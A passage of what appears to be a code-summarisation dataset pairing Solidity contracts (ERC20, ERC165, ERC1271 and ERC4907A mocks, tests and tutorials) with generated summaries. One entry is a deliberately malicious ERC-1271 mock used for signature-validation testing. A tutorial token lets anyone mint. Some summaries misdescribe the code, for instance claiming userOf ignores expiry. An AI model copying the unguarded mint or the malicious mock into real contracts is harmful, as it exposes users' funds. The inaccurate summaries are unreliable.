        "summary": "This code implements the ERC1155 token standard, which is a multi-token standard. The contract defines functions to handle balance queries, transfers of tokens, batch transfers of tokens, and approvals. It also includes functions to mint and burn tokens. The contract implements the IERC1155, IERC1155MetadataURI, and IERC165 interfaces. Additionally, it checks for safe transfers and approvals using the IERC1155Receiver interface. Finally, the contract defines the uri() function, which returns the URI for a given token ID, similar to the tokenURI function in ERC721.",
        "id": "186f0d62-98d8-4b42-aacd-f29ffdf81b2e",
        "api_seq": "ERC1271MaliciousMock"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\nimport {IERC1271} from \"openzeppelin/interfaces/IERC1271.sol\";\n\n/**\n * @title ERC1271MaliciousMock\n * @author pcaversaccio\n * @notice Forked and adjusted accordingly from here:\n * https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/mocks/ERC1271WalletMock.sol.\n * @dev Allows to mock a malicious ERC-1271 implementation.\n */\ncontract ERC1271MaliciousMock is IERC1271 {\n    /**\n     * @dev Returns a malicious 4-byte magic value.\n     * @return bytes4 The malicious 4-byte magic value.\n     */\n    function isValidSignature(\n        bytes32,\n        bytes memory\n    ) public pure override returns (bytes4) {\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            mstore(\n                0,\n                0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n            )\n            return(0, 32)\n        }\n    }\n}\n",
        "summary": "This is a Solidity contract that allows to mock a malicious implementation of the ERC-1271 interface. The contract overrides the `isValidSignature` function of the `IERC1271` interface and returns a 4-byte malicious magic value of all `f` (0xffffffff). This can be used to test and simulate a scenario where a contract is maliciously implementing the ERC-1271 interface.",
        "id": "db266716-8704-4674-b088-29280c5016f5",
        "api_seq": "ERC1271WalletMock"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\nimport {Ownable} from \"openzeppelin/access/Ownable.sol\";\nimport {IERC1271} from \"openzeppelin/interfaces/IERC1271.sol\";\nimport {ECDSA} from \"openzeppelin/utils/cryptography/ECDSA.sol\";\n\n/**\n * @title ERC1271WalletMock\n * @author pcaversaccio\n * @notice Forked and adjusted accordingly from here:\n * https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/mocks/ERC1271WalletMock.sol.\n * @dev Allows to mock a correct ERC-1271 implementation.\n */\ncontract ERC1271WalletMock is Ownable, IERC1271 {\n    constructor(address originalOwner_) {\n        _transferOwnership(originalOwner_);\n    }\n\n    /**\n     * @dev Returns the 4-byte magic value `0x1626ba7e` if the verification passes.\n     * @param hash The 32-byte message digest that was signed.\n     * @param signature The secp256k1 64/65-byte signature of `hash`.\n     * @return bytes4 The 4-byte magic value.\n     */\n    function isValidSignature(\n        bytes32 hash,\n        bytes memory signature\n    ) public view override returns (bytes4) {\n        return\n            ECDSA.recover(hash, signature) == owner()\n                ? this.isValidSignature.selector\n                : bytes4(0);\n    }\n}\n",
        "summary": "This is a Solidity smart contract that allows for testing a correct implementation of the ERC-1271 standard. The contract provides a function `isValidSignature` which takes in a `hash` and a `signature` parameter and returns a `bytes4` magic value `0x1626ba7e` if the signature is valid and the signer is the contract owner. It inherits from `Ownable` contract in OpenZeppelin and it imports the `IERC1271` interface and `ECDSA` contract from OpenZeppelin.",
        "id": "9a66976e-2c61-45be-94f5-65de4b063905",
        "api_seq": "ERC165"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)\n\npragma solidity ^0.8.0;\n\nimport \"./IERC165.sol\";\n\n/**\n * @dev Implementation of the {IERC165} interface.\n *\n * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check\n * for the additional interface id that will be supported. For example:\n *\n * ```solidity\n * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\n *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);\n * }\n * ```\n *\n * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.\n */\nabstract contract ERC165 is IERC165 {\n    /**\n     * @dev See {IERC165-supportsInterface}.\n     */\n    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\n        return interfaceId == type(IERC165).interfaceId;\n    }\n}\n",
        "summary": "This code defines an abstract contract ERC165 that inherits from interface IERC165 and implements its function supportsInterface. Contracts that want to implement ERC165 can inherit from this contract and override supportsInterface to check for additional interface IDs that will be supported. This is done by checking if the provided interface ID is the same as the interface ID of IERC165. The comment at the beginning of the code indicates its SPDX license identifier.",
        "id": "4c2956b4-52f2-48a4-9e3b-aaf81ef05984",
        "api_seq": "ERC20"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// WTF Solidity by 0xAA\n\npragma solidity ^0.8.4;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ncontract ERC20 is IERC20 {\n\n    mapping(address => uint256) public override balanceOf;\n\n    mapping(address => mapping(address => uint256)) public override allowance;\n\n    uint256 public override totalSupply;   // \u4ee3\u5e01\u603b\u4f9b\u7ed9\n\n    string public name;   // \u540d\u79f0\n    string public symbol;  // \u7b26\u53f7\n    \n    uint8 public decimals = 18; // \u5c0f\u6570\u4f4d\u6570\n\n    // @dev \u5728\u5408\u7ea6\u90e8\u7f72\u7684\u65f6\u5019\u5b9e\u73b0\u4ee3\u5e01\u540d\u79f0\u548c\u7b26\u53f7\n    constructor(string memory name_, string memory symbol_){\n        name = name_;\n        symbol = symbol_;\n    }\n\n    // @dev \u5b9e\u73b0`transfer`\u51fd\u6570\uff0c\u4ee3\u5e01\u8f6c\u8d26\u903b\u8f91\n    function transfer(address recipient, uint amount) external override returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    // @dev \u5b9e\u73b0 `approve` \u51fd\u6570, \u4ee3\u5e01\u6388\u6743\u903b\u8f91\n    function approve(address spender, uint amount) external override returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    // @dev \u5b9e\u73b0`transferFrom`\u51fd\u6570\uff0c\u4ee3\u5e01\u6388\u6743\u8f6c\u8d26\u903b\u8f91\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint amount\n    ) external override returns (bool) {\n        allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    // @dev \u94f8\u9020\u4ee3\u5e01\uff0c\u4ece `0` \u5730\u5740\u8f6c\u8d26\u7ed9 \u8c03\u7528\u8005\u5730\u5740\n    function mint(uint amount) external {\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), msg.sender, amount);\n    }\n\n    // @dev \u9500\u6bc1\u4ee3\u5e01\uff0c\u4ece \u8c03\u7528\u8005\u5730\u5740 \u8f6c\u8d26\u7ed9  `0` \u5730\u5740\n    function burn(uint amount) external {\n        balanceOf[msg.sender] -= amount;\n        totalSupply -= amount;\n        emit Transfer(msg.sender, address(0), amount);\n    }\n\n}",
        "summary": "This is a Solidity smart contract for an ERC20 token. It includes functions for transferring tokens, approving/token allowance, and minting/burning tokens. It also has mappings to keep track of balances and allowances, and a total supply variable. Additionally, the contract has a constructor function to specify the name and symbol of the token. The contract imports the IERC20 interface from OpenZeppelin for standard ERC20 functions.",
        "id": "3ad16af7-e164-4dc2-8717-458777d5c409",
        "api_seq": "ERC20.t"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.15;\n\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\nimport {DSInvariantTest} from \"./utils/DSInvariantTest.sol\";\n\nimport {MockERC20} from \"./utils/mocks/MockERC20.sol\";\n\ncontract ERC20Test is DSTestPlus {\n    MockERC20 token;\n\n    bytes32 constant PERMIT_TYPEHASH =\n        keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n\n    function setUp() public {\n        token = new MockERC20(\"Token\", \"TKN\", 18);\n    }\n\n    function invariantMetadata() public {\n        assertEq(token.name(), \"Token\");\n        assertEq(token.symbol(), \"TKN\");\n        assertEq(token.decimals(), 18);\n    }\n\n    function testMint() public {\n        token.mint(address(0xBEEF), 1e18);\n\n        assertEq(token.totalSupply(), 1e18);\n        assertEq(token.balanceOf(address(0xBEEF)), 1e18);\n    }\n\n    function testBurn() public {\n        token.mint(address(0xBEEF), 1e18);\n        token.burn(address(0xBEEF), 0.9e18);\n\n        assertEq(token.totalSupply(), 1e18 - 0.9e18);\n        assertEq(token.balanceOf(address(0xBEEF)), 0.1e18);\n    }\n\n    function testApprove() public {\n        assertTrue(token.approve(address(0xBEEF), 1e18));\n\n        assertEq(token.allowance(address(this), address(0xBEEF)), 1e18);\n    }\n\n    function testTransfer() public {\n        token.mint(address(this), 1e18);\n\n        assertTrue(token.transfer(address(0xBEEF), 1e18));\n        assertEq(token.totalSupply(), 1e18);\n\n        assertEq(token.balanceOf(address(this)), 0);\n        assertEq(token.balanceOf(address(0xBEEF)), 1e18);\n    }\n\n    function testTransferFrom() public {\n        address from = address(0xABCD);\n\n        token.mint(from, 1e18);\n\n        hevm.prank(from);\n        token.approve(address(this), 1e18);\n\n        assertTrue(token.transferFrom(from, address(0xBEEF), 1e18));\n        assertEq(token.totalSupply(), 1e18);\n\n        assertEq(token.allowance(from, address(this)), 0);\n\n        assertEq(token.balanceOf(from), 0);\n        assertEq(token.balanceOf(address(0xBEEF)), 1e18);\n    }\n\n    function testInfiniteApproveTransferFrom() public {\n        address from = address(0xABCD);\n\n        token.mint(from, 1e18);\n\n        hevm.prank(from);\n        token.approve(address(this), type(uint256).max);\n\n        assertTrue(token.transferFrom(from, address(0xBEEF), 1e18));\n        assertEq(token.totalSupply(), 1e18);\n\n        assertEq(token.allowance(from, address(this)), type(uint256).max);\n\n        assertEq(token.balanceOf(from), 0);\n        assertEq(token.balanceOf(address(0xBEEF)), 1e18);\n    }\n\n    function testPermit() public {\n        uint256 privateKey = 0xBEEF;\n        address owner = hevm.addr(privateKey);\n\n        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(\n            privateKey,\n            keccak256(\n                abi.encodePacked(\n                    \"\\x19\\x01\",\n                    token.DOMAIN_SEPARATOR(),\n                    keccak256(abi.encode(PERMIT_TYPEHASH, owner, address(0xCAFE), 1e18, 0, block.timestamp))\n                )\n            )\n        );\n\n        token.permit(owner, address(0xCAFE), 1e18, block.timestamp, v, r, s);\n\n        assertEq(token.allowance(owner, address(0xCAFE)), 1e18);\n        assertEq(token.nonces(owner), 1);\n    }\n\n    function testFailTransferInsufficientBalance() public {\n        token.mint(address(this), 0.9e18);\n        token.transfer(address(0xBEEF), 1e18);\n    }\n\n    function testFailTransferFromInsufficientAllowance() public {\n        address from = address(0xABCD);\n\n        token.mint(from, 1e18);\n\n        hevm.prank(from);\n        token.approve(address(this), 0.9e18);\n\n        token.transferFrom(from, address(0xBEEF), 1e18);\n    }\n\n    function testFailTransferFromInsufficientBalance() public {\n        address from = address(0xABCD);\n\n        token.mint(from, 0.9e18);\n\n        hevm.prank(from);\n        token.approve(address(this), 1e18);\n\n        token.transferFrom(from, address(0xBEEF), 1e18);\n    }\n\n    function testFailPermitBadNonce() public {\n        uint256 privateKey = 0xBEEF;\n        address owner = hevm.addr(privateKey);\n\n        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(\n            privateKey,\n            keccak256(\n                abi.encodePacked(\n                    \"\\x19\\x01\",\n                    token.DOMAIN_SEPARATOR(),\n                    keccak256(abi.encode(PERMIT_TYPEHASH, owner, address(0xCAFE), 1e18, 1, block.timestamp))\n                )\n            )\n        );\n\n        token.permit(owner, address(0xCAFE), 1e18, block.timestamp, v, r, s);\n    }\n\n    function testFailPermitBadDeadline() public {\n        uint256 privateKey = 0xBEEF;\n        address owner = hevm.addr(privateKey);\n\n        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(\n            privateKey,\n            keccak256(\n                abi.encodePacked(\n                    \"\\x19\\x01\",\n                    token.DOMAIN_SEPARATOR(),\n                    keccak256(abi.encode(PERMIT_TYPEHASH, owner, address(0xCAFE), 1e18, 0, block.timestamp))\n                )\n            )\n        );\n\n        token.permit(owner, address(0xCAFE), 1e18, block.timestamp + 1, v, r, s);\n    }\n\n    function testFailPermitPastDeadline() public {\n        uint256 oldTimestamp = block.timestamp;\n        uint256 privateKey = 0xBEEF;\n        address owner = hevm.addr(privateKey);\n\n        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(\n            privateKey,\n            keccak256(\n                abi.encodePacked(\n                    \"\\x19\\x01\",\n                    token.DOMAIN_SEPARATOR(),\n                    keccak256(abi.encode(PERMIT_TYPEHASH, owner, address(0xCAFE), 1e18, 0, oldTimestamp))\n                )\n            )\n        );\n\n        hevm.warp(block.timestamp + 1);\n        token.permit(owner, address(0xCAFE), 1e18, oldTimestamp, v, r, s);\n    }\n\n    function testFailPermitReplay() public {\n        uint256 privateKey = 0xBEEF;\n        address owner = hevm.addr(privateKey);\n\n        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(\n            privateKey,\n            keccak256(\n                abi.encodePacked(\n                    \"\\x19\\x01\",\n                    token.DOMAIN_SEPARATOR(),\n                    keccak256(abi.encode(PERMIT_TYPEHASH, owner, address(0xCAFE), 1e18, 0, block.timestamp))\n                )\n            )\n        );\n\n        token.permit(owner, address(0xCAFE), 1e18, block.timestamp, v, r, s);\n        token.permit(owner, address(0xCAFE), 1e18, block.timestamp, v, r, s);\n    }\n\n    function testMetadata(\n        string calldata name,\n        string calldata symbol,\n        uint8 decimals\n    ) public {\n        MockERC20 tkn = new MockERC20(name, symbol, decimals);\n        assertEq(tkn.name(), name);\n        assertEq(tkn.symbol(), symbol);\n        assertEq(tkn.decimals(), decimals);\n    }\n\n    function testMint(address from, uint256 amount) public {\n        token.mint(from, amount);\n\n        assertEq(token.totalSupply(), amount);\n        assertEq(token.balanceOf(from), amount);\n    }\n\n    function testBurn(\n        address from,\n        uint256 mintAmount,\n        uint256 burnAmount\n    ) public {\n        burnAmount = bound(burnAmount, 0, mintAmount);\n\n        token.mint(from, mintAmount);\n        token.burn(from, burnAmount);\n\n        assertEq(token.totalSupply(), mintAmount - burnAmount);\n        assertEq(token.balanceOf(from), mintAmount - burnAmount);\n    }\n\n    function testApprove(address to, uint256 amount) public {\n        assertTrue(token.approve(to, amount));\n\n        assertEq(token.allowance(address(this), to), amount);\n    }\n\n    function testTransfer(address from, uint256 amount) public {\n        token.mint(address(this), amount);\n\n        assertTrue(token.transfer(from, amount));\n        assertEq(token.totalSupply(), amount);\n\n        if (address(this) == from) {\n            assertEq(token.balanceOf(address(this)), amount);\n        } else {\n            assertEq(token.balanceOf(address(this)), 0);\n            assertEq(token.balanceOf(from), amount);\n        }\n    }\n\n    function testTransferFrom(\n        address to,\n        uint256 approval,\n        uint256 amount\n    ) public {\n        amount = bound(amount, 0, approval);\n\n        address from = address(0xABCD);\n\n        token.mint(from, amount);\n\n        hevm.prank(from);\n        token.approve(address(this), approval);\n\n        assertTrue(token.transferFrom(from, to, amount));\n        assertEq(token.totalSupply(), amount);\n\n        uint256 app = from == address(this) || approval == type(uint256).max ? approval : approval - amount;\n        assertEq(token.allowance(from, address(this)), app);\n\n        if (from == to) {\n            assertEq(token.balanceOf(from), amount);\n        } else {\n            assertEq(token.balanceOf(from), 0);\n            assertEq(token.balanceOf(to), amount);\n        }\n    }\n\n    function testPermit(\n        uint248 privKey,\n        address to,\n        uint256 amount,\n        uint256 deadline\n    ) public {\n        uint256 privateKey = privKey;\n        if (deadline < block.timestamp) deadline = block.timestamp;\n        if (privateKey == 0) privateKey = 1;\n\n        address owner = hevm.addr(privateKey);\n\n        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(\n            privateKey,\n            keccak256(\n                abi.encodePacked(\n                    \"\\x19\\x01\",\n                    token.DOMAIN_SEPARATOR(),\n                    keccak256(abi.encode(PERMIT_TYPEHASH, owner, to, amount, 0, deadline))\n                )\n            )\n        );\n\n        token.permit(owner, to, amount, deadline, v, r, s);\n\n        assertEq(token.allowance(owner, to), amount);\n        assertEq(token.nonces(owner), 1);\n    }\n\n    function testFailBurnInsufficientBalance(\n        address to,\n        uint256 mintAmount,\n        uint256 burnAmount\n    ) public {\n        burnAmount = bound(burnAmount, mintAmount + 1, type(uint256).max);\n\n        token.mint(to, mintAmount);\n        token.burn(to, burnAmount);\n    }\n\n    function testFailTransferInsufficientBalance(\n        address to,\n        uint256 mintAmount,\n        uint256 sendAmount\n    ) public {\n        sendAmount = bound(sendAmount, mintAmount + 1, type(uint256).max);\n\n        token.mint(address(this), mintAmount);\n        token.transfer(to, sendAmount);\n    }\n\n    function testFailTransferFromInsufficientAllowance(\n        address to,\n        uint256 approval,\n        uint256 amount\n    ) public {\n        amount = bound(amount, approval + 1, type(uint256).max);\n\n        address from = address(0xABCD);\n\n        token.mint(from, amount);\n\n        hevm.prank(from);\n        token.approve(address(this), approval);\n\n        token.transferFrom(from, to, amount);\n    }\n\n    function testFailTransferFromInsufficientBalance(\n        address to,\n        uint256 mintAmount,\n        uint256 sendAmount\n    ) public {\n        sendAmount = bound(sendAmount, mintAmount + 1, type(uint256).max);\n\n        address from = address(0xABCD);\n\n        token.mint(from, mintAmount);\n\n        hevm.prank(from);\n        token.approve(address(this), sendAmount);\n\n        token.transferFrom(from, to, sendAmount);\n    }\n\n    function testFailPermitBadNonce(\n        uint256 privateKey,\n        address to,\n        uint256 amount,\n        uint256 deadline,\n        uint256 nonce\n    ) public {\n        if (deadline < block.timestamp) deadline = block.timestamp;\n        if (privateKey == 0) privateKey = 1;\n        if (nonce == 0) nonce = 1;\n\n        address owner = hevm.addr(privateKey);\n\n        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(\n            privateKey,\n            keccak256(\n                abi.encodePacked(\n                    \"\\x19\\x01\",\n                    token.DOMAIN_SEPARATOR(),\n                    keccak256(abi.encode(PERMIT_TYPEHASH, owner, to, amount, nonce, deadline))\n                )\n            )\n        );\n\n        token.permit(owner, to, amount, deadline, v, r, s);\n    }\n\n    function testFailPermitBadDeadline(\n        uint256 privateKey,\n        address to,\n        uint256 amount,\n        uint256 deadline\n    ) public {\n        if (deadline < block.timestamp) deadline = block.timestamp;\n        if (privateKey == 0) privateKey = 1;\n\n        address owner = hevm.addr(privateKey);\n\n        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(\n            privateKey,\n            keccak256(\n                abi.encodePacked(\n                    \"\\x19\\x01\",\n                    token.DOMAIN_SEPARATOR(),\n                    keccak256(abi.encode(PERMIT_TYPEHASH, owner, to, amount, 0, deadline))\n                )\n            )\n        );\n\n        token.permit(owner, to, amount, deadline + 1, v, r, s);\n    }\n\n    function testFailPermitPastDeadline(\n        uint256 privateKey,\n        address to,\n        uint256 amount,\n        uint256 deadline\n    ) public {\n        deadline = bound(deadline, 0, block.timestamp - 1);\n        if (privateKey == 0) privateKey = 1;\n\n        address owner = hevm.addr(privateKey);\n\n        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(\n            privateKey,\n            keccak256(\n                abi.encodePacked(\n                    \"\\x19\\x01\",\n                    token.DOMAIN_SEPARATOR(),\n                    keccak256(abi.encode(PERMIT_TYPEHASH, owner, to, amount, 0, deadline))\n                )\n            )\n        );\n\n        token.permit(owner, to, amount, deadline, v, r, s);\n    }\n\n    function testFailPermitReplay(\n        uint256 privateKey,\n        address to,\n        uint256 amount,\n        uint256 deadline\n    ) public {\n        if (deadline < block.timestamp) deadline = block.timestamp;\n        if (privateKey == 0) privateKey = 1;\n\n        address owner = hevm.addr(privateKey);\n\n        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(\n            privateKey,\n            keccak256(\n                abi.encodePacked(\n                    \"\\x19\\x01\",\n                    token.DOMAIN_SEPARATOR(),\n                    keccak256(abi.encode(PERMIT_TYPEHASH, owner, to, amount, 0, deadline))\n                )\n            )\n        );\n\n        token.permit(owner, to, amount, deadline, v, r, s);\n        token.permit(owner, to, amount, deadline, v, r, s);\n    }\n}\n\ncontract ERC20Invariants is DSTestPlus, DSInvariantTest {\n    BalanceSum balanceSum;\n    MockERC20 token;\n\n    function setUp() public {\n        token = new MockERC20(\"Token\", \"TKN\", 18);\n        balanceSum = new BalanceSum(token);\n\n        addTargetContract(address(balanceSum));\n    }\n\n    function invariantBalanceSum() public {\n        assertEq(token.totalSupply(), balanceSum.sum());\n    }\n}\n\ncontract BalanceSum {\n    MockERC20 token;\n    uint256 public sum;\n\n    constructor(MockERC20 _token) {\n        token = _token;\n    }\n\n    function mint(address from, uint256 amount) public {\n        token.mint(from, amount);\n        sum += amount;\n    }\n\n    function burn(address from, uint256 amount) public {\n        token.burn(from, amount);\n        sum -= amount;\n    }\n\n    function approve(address to, uint256 amount) public {\n        token.approve(to, amount);\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public {\n        token.transferFrom(from, to, amount);\n    }\n\n    function transfer(address to, uint256 amount) public {\n        token.transfer(to, amount);\n    }\n}\n",
        "summary": "This code defines a Solidity contract called ERC20Test that tests the functionality of an ERC20 token contract. It includes functions to test minting, burning, approving, transferring, and transferring from the token contract, as well as a function to test the permit functionality. The contract also includes a function to test metadata and several functions to test various failure scenarios. It imports several utility contracts, including DSTestPlus and DSInvariantTest for testing and BalanceSum and MockERC20 for utility functions and mocking contracts. Finally, this contract also includes another contract called ERC20Invariants which defines invariant tests for the balance sum of the ERC20 token.",
        "id": "7021ff0f-c523-472f-893a-471e7bfaced7",
        "api_seq": "ERC20Mock"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\nimport {ERC20} from \"openzeppelin/token/ERC20/ERC20.sol\";\n\n/**\n * @title ERC20Mock\n * @author pcaversaccio\n * @notice Forked and adjusted accordingly from here:\n * https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/mocks/ERC20Mock.sol.\n * @dev Allows to mock a simple ERC-20 implementation.\n */\ncontract ERC20Mock is ERC20 {\n    constructor(\n        string memory name_,\n        string memory symbol_,\n        address initialAccount_,\n        uint256 initialBalance_\n    ) payable ERC20(name_, symbol_) {\n        _mint(initialAccount_, initialBalance_);\n    }\n\n    /**\n     * @dev Creates `amount` tokens and assigns them to `account`.\n     * @param account The 20-byte account address.\n     * @param amount The 32-byte token amount to be created.\n     */\n    function mint(address account, uint256 amount) public {\n        _mint(account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`.\n     * @param account The 20-byte account address.\n     * @param amount The 32-byte token amount to be destroyed.\n     */\n    function burn(address account, uint256 amount) public {\n        _burn(account, amount);\n    }\n}\n",
        "summary": "This is a Solidity smart contract that implements a mock ERC-20 token. It imports the `ERC20` contract from the OpenZeppelin library and initializes a new token with a given name, symbol, initial account owner, and balance. It also includes two functions, `mint` and `burn`, for creating and destroying tokens, respectively.",
        "id": "7ab89b42-0bab-4a60-8d30-20c5535a5c32",
        "api_seq": "ERC223"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\ninterface ERC223 {\n    function transfer(address _to, uint _value, bytes _data) public returns (bool);\n    event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);\n}\n",
        "summary": "This code declares an interface for an ERC223 token contract. The interface specifies a function called \"transfer\" which takes in three arguments: the address of the recipient, the value of the transaction, and an optional data payload. It also includes an event declaration for the \"Transfer\" which emits the sender's address, the recipient's address, the value transferred, and an optional data payload.",
        "id": "07ba78b4-65e8-4965-a123-944c38c6729c",
        "api_seq": "ERC223ReceivingContract"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\ncontract ERC223ReceivingContract {\n    function tokenFallback(address _from, uint _value, bytes _data) public;\n}",
        "summary": "This code defines a contract named \"ERC223ReceivingContract\". This contract has a single function called \"tokenFallback\" which takes three parameters: \"_from\" of address datatype, \"_value\" of uint datatype and \"_data\" of bytes datatype. The function is declared as public.",
        "id": "dd7b9265-6a10-4fc5-91ca-c2f4b72a5bb4",
        "api_seq": "ERC4907A"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// ERC721A Contracts v4.2.3\n// Creator: Chiru Labs\n\npragma solidity ^0.8.4;\n\nimport './IERC4907A.sol';\nimport '../ERC721A.sol';\n\n/**\n * @title ERC4907A\n *\n * @dev [ERC4907](https://eips.ethereum.org/EIPS/eip-4907) compliant\n * extension of ERC721A, which allows owners and authorized addresses\n * to add a time-limited role with restricted permissions to ERC721 tokens.\n */\nabstract contract ERC4907A is ERC721A, IERC4907A {\n    // The bit position of `expires` in packed user info.\n    uint256 private constant _BITPOS_EXPIRES = 160;\n\n    // Mapping from token ID to user info.\n    //\n    // Bits Layout:\n    // - [0..159]   `user`\n    // - [160..223] `expires`\n    mapping(uint256 => uint256) private _packedUserInfo;\n\n    /**\n     * @dev Sets the `user` and `expires` for `tokenId`.\n     * The zero address indicates there is no user.\n     *\n     * Requirements:\n     *\n     * - The caller must own `tokenId` or be an approved operator.\n     */\n    function setUser(\n        uint256 tokenId,\n        address user,\n        uint64 expires\n    ) public virtual override {\n        // Require the caller to be either the token owner or an approved operator.\n        address owner = ownerOf(tokenId);\n        if (_msgSenderERC721A() != owner)\n            if (!isApprovedForAll(owner, _msgSenderERC721A()))\n                if (getApproved(tokenId) != _msgSenderERC721A()) _revert(SetUserCallerNotOwnerNorApproved.selector);\n\n        _packedUserInfo[tokenId] = (uint256(expires) << _BITPOS_EXPIRES) | uint256(uint160(user));\n\n        emit UpdateUser(tokenId, user, expires);\n    }\n\n    /**\n     * @dev Returns the user address for `tokenId`.\n     * The zero address indicates that there is no user or if the user is expired.\n     */\n    function userOf(uint256 tokenId) public view virtual override returns (address) {\n        uint256 packed = _packedUserInfo[tokenId];\n        assembly {\n            // Branchless `packed *= (block.timestamp <= expires ? 1 : 0)`.\n            // If the `block.timestamp == expires`, the `lt` clause will be true\n            // if there is a non-zero user address in the lower 160 bits of `packed`.\n            packed := mul(\n                packed,\n                // `block.timestamp <= expires ? 1 : 0`.\n                lt(shl(_BITPOS_EXPIRES, timestamp()), packed)\n            )\n        }\n        return address(uint160(packed));\n    }\n\n    /**\n     * @dev Returns the user's expires of `tokenId`.\n     */\n    function userExpires(uint256 tokenId) public view virtual override returns (uint256) {\n        return _packedUserInfo[tokenId] >> _BITPOS_EXPIRES;\n    }\n\n    /**\n     * @dev Override of {IERC165-supportsInterface}.\n     */\n    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC721A, IERC721A) returns (bool) {\n        // The interface ID for ERC4907 is `0xad092b5c`,\n        // as defined in [ERC4907](https://eips.ethereum.org/EIPS/eip-4907).\n        return super.supportsInterface(interfaceId) || interfaceId == 0xad092b5c;\n    }\n\n    /**\n     * @dev Returns the user address for `tokenId`, ignoring the expiry status.\n     */\n    function _explicitUserOf(uint256 tokenId) internal view virtual returns (address) {\n        return address(uint160(_packedUserInfo[tokenId]));\n    }\n}\n",
        "summary": "This code is a Solidity smart contract called \"ERC4907A\". It is an extension of ERC721A and implements the ERC4907 standard. ERC4907A allows owners and authorized addresses to add a time-limited role with restricted permissions to ERC721 tokens. \n\nERC4907A uses the `_BITPOS_EXPIRES` constant to store the expiration time for a role within a token's `packedUserInfo` mapping. The `setUser` function sets the `user` and `expires` for a token, after checking that the caller is either the token owner or an approved operator. The `userOf` function returns the user address for a token, ignoring the expiry status. The `userExpire` function returns the user's expiration time for a token. \n\nThe contract also overrides the `supportsInterface` function to support the ERC4907 interface ID.",
        "id": "09282e83-a1fe-4c4e-97bc-649a20134427",
        "api_seq": "Error"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\n// Gas cost\u5728Remix\u4e2d\u6d4b\u8bd5\u5f97\u5230 \u4f7f\u75280.8.17\u7248\u672c\u7f16\u8bd1\n// \u53c2\u6570\u4f7f\u7528 tokenId = 123, address = {any address}\n\n// \u81ea\u5b9a\u4e49error\nerror TransferNotOwner();\n\n// error TransferNotOwner(address sender);\n\ncontract Errors {\n    // \u4e00\u7ec4\u6620\u5c04\uff0c\u8bb0\u5f55\u6bcf\u4e2aTokenId\u7684Owner\n    mapping(uint256 => address) private _owners;\n\n    // Error\u65b9\u6cd5: gas cost 24457\n    // Error with parameter: gas cost 24660\n    function transferOwner1(uint256 tokenId, address newOwner) public {\n        if (_owners[tokenId] != msg.sender) {\n            revert TransferNotOwner();\n            // revert TransferNotOwner(msg.sender);\n        }\n        _owners[tokenId] = newOwner;\n    }\n\n    // require\u65b9\u6cd5: gas cost 24755\n    function transferOwner2(uint256 tokenId, address newOwner) public {\n        require(_owners[tokenId] == msg.sender, \"Transfer Not Owner\");\n        _owners[tokenId] = newOwner;\n    }\n\n    // assert\u65b9\u6cd5: gas cost 24473\n    function transferOwner3(uint256 tokenId, address newOwner) public {\n        assert(_owners[tokenId] == msg.sender);\n        _owners[tokenId] = newOwner;\n    }\n}\n",
        "summary": "This is a Solidity smart contract that defines three functions to transfer ownership of a token in a mapping that records the owner of each token. Each function uses a different method to check if the caller of the function is the owner of the token: \n\n1. `transferOwner1` uses a custom error message (`TransferNotOwner()`) and reverts the transaction if the check fails. \n2. `transferOwner2` uses the built-in `require` function with a string error message and reverts if the check fails. \n3. `transferOwner3` uses the built-in `assert` function and throws an exception if the check fails. \n\nEach function takes two arguments, a `tokenId` and a new `owner` address. The SPDX license identifier denotes the license under which the code is distributed and the Solidity version required to compile it is specified.",
        "id": "bd92c3ce-c590-4850-b33a-7ceffbb423c5",
        "api_seq": "EtherReceiver"
    },
    {
